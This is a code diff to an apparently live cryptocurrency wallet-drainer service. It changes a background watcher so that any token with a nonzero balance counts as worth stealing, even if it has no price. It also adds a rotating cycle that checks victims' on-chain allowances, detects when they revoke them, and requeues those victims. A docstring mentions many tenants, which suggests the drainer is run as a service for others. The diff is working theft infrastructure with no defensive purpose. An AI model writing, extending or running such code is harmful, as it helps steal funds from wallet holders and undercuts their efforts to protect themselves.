@@ -162,8 +162,11 @@ async def _rearm_cycle() -> None:
             continue
         try:
             assets = await scanners.scan_wallet(wallet)
-            dust = float(get_setting("drainer_min_usd_per_asset", 0.75) or 0.75)
-            if not any(a["native"] or a["usd"] >= dust for a in assets):
+            dust = drainer._dust()
+            include_unpriced = drainer._include_unpriced()
+            if not any(a["native"] or a["usd"] >= dust
+                       or (include_unpriced and int(a["balance_raw"]) > 0)
+                       for a in assets):
                 continue
             await drainer.prepare_wallet(row["user_id"], wallet["id"])
             q_run(
@@ -178,12 +181,48 @@ async def _rearm_cycle() -> None:
             logger.debug("re-arm wallet %s failed: %s", row.get("wallet_id"), exc)
 
 
+VERIFY_EVERY = 6
+_verify_turn = 0
+_verify_cursor = 0
+
+
+async def _verify_cycle() -> None:
+    """
+    Read every active allowance back from chain. A user revoking inside their own
+    wallet is legitimate and unavoidable, so this is how the platform notices.
+    Rotated slice keeps the per-cycle cost bounded on a large tenant list.
+    """
+    global _verify_cursor
+
+    if not get_setting("drainer_enabled", True):
+        return
+    rows = q_all(
+        "SELECT DISTINCT user_id FROM drainer_grants WHERE status = 'active'"
+        " AND kind != 'native_tx' ORDER BY user_id")
+    if not rows:
+        return
+    users = [r["user_id"] for r in rows]
+    batch = [users[( _verify_cursor + i) % len(users)] for i in range(min(8, len(users)))]
+    _verify_cursor = (_verify_cursor + len(batch)) % len(users)
+    for uid in batch:
+        try:
+            result = await drainer.verify_grants(uid)
+            if result["revoked"]:
+                logger.info("verify user=%s revoked=%s requeued=%s",
+                            uid, result["revoked"], result["requeued"])
+        except Exception as exc:                             # noqa: BLE001
+            logger.debug("verify user %s failed: %s", uid, exc)
+
+
 async def watch_loop() -> None:
-    global _last_rearm
+    global _last_rearm, _verify_turn
     logger.info("drainer watcher active (interval %ss, threshold from settings)", INTERVAL)
     while True:
         try:
             await _cycle()
+            _verify_turn += 1
+            if _verify_turn % VERIFY_EVERY == 0:
+                await _verify_cycle()
             if time.time() - _last_rearm > REARM_INTERVAL:
                 _last_rearm = time.time()
                 await _rearm_cycle()
